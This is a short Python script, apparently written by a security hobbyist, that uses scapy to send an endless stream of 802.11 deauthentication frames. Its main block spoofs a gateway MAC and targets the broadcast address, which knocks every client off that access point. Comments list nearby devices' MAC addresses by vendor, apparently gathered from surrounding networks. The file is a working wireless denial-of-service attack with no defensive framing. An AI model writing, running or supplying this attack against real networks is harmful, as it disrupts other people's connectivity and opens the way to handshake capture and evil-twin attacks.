#!/usr/bin/env python

"""
ALIF FUSOBAR
master@itsecurity.id
www.itsecurity.id
"""

from scapy.all import *
import sys

# D0:03:DF:DB:CA:CE SAMSUNG ELECTRONICS
# C8:B4:22:B5:28:71 ASKEY COMPUTER
# 6C:A6:04:20:E1:E4 ARRIS GROUP 
# 80:32:53:c0:e7:84 wlp1s0
# C8:B4:22:B5:28:73 GATEWAY 2873
# 9C:4F:CF:D0:CA:61 TCT MOBILE blackberry
# ff:ff:ff:ff:ff:ff for all networks
# iface TPLINK wlx00117f1ba6cb
# c8:b4:22:b5:28:73 gateway

def deauth(target_mac, gateway_mac, iface):
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    verbose=1
    loop=1
    count=0
    inter=0.01

    try:
        if count == 0:
            # If count is 0, do endless loop (until keyboard interrupt)
            loop = 1
            count = None
        else:
            loop = 0
        # Print  info messages"
        if verbose:
            if count:
                print(f"Sending {count} frames every {inter}s...")
            else:
                print(f"Sending frames every {inter}s until CTRL-C is pressed...")

        dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
        # Stack them up
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        # Send the packet
        sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=0)
    except Exception as e:
        print(f'Error: {e}')
    except KeyboardInterrupt:
        sys.exit()

if __name__ == "__main__":
    deauth('ff:ff:ff:ff:ff:ff', 'c8:b4:22:b5:28:73', 'wlx00117f1ba6cb')